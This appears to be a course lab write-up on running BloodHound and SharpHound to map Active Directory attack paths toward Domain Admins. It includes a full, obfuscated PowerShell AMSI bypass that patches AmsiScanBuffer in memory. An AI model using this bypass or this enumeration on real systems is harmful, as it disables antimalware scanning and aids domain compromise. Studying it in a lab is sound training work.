# 🐩 BloodHound, Identify Paths

I start by unziping the file C:\AD\Tools\neo4j-community-4.1.1- windows.zip

then i started the neo4j server like this:

```
.\neo4j.bat install-service
.\neo4j.bat start
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I get on this page with simple password neo4j:neo4j

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now i launch bloodhound via the following path (C:\AD\Tools\BloodHound-win32-x64\BloodHound-win32-x64) and enter the credentials that i set&#x20;

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I then open my terminal and using invisishell and do the following

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
cd C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
```

Then i'm going to copy and paste this code snip in my terminal to bypass .NET AMSI before running SharpHound.ps1:

<pre><code><strong>$ZQCUW = @"
</strong>using System;
using System.Runtime.InteropServices;
public class ZQCUW {
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
 [DllImport("kernel32")]
 public static extern IntPtr LoadLibrary(string name);
 [DllImport("kernel32")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#x26;#97;&#x26;#109;&#x26;#115;&#x26;#105;&#x26;#46;&#x26;#100;&#x26;#108;&#x26;#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#x26;#65;&#x26;#109;&#x26;#115;&#x26;#105;&#x26;#83;&#x26;#99;&#x26;#97;&#x26;#110;&#x26;#66;&#x26;#117;&#x26;#102;&#x26;#102;&#x26;#101;&#x26;#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
</code></pre>

Then we can simply run sharphound

```
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then we can upload the JSON files to get a visual render with the GUI.&#x20;

I can look for myself:

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

In Node Info, scroll down to 'LOCAL ADMIN RIGHTS' and expand 'Derivative Local Admin Rights' to find if student613 has derivate local admin rights on any machine!

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption><p>Theres an issue with GUI so this screenshot is from course content</p></figcaption></figure>

To complete the task we go on the Web UI of bloodhound provided by the course, login with the creds and follow with this methodology:

n the Web UI, click on Cypher -> Click on the Folder Icon -> Pre-Built Searches -> Active Directory -> (Scroll down) -> Shortest paths to Domain Admins

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

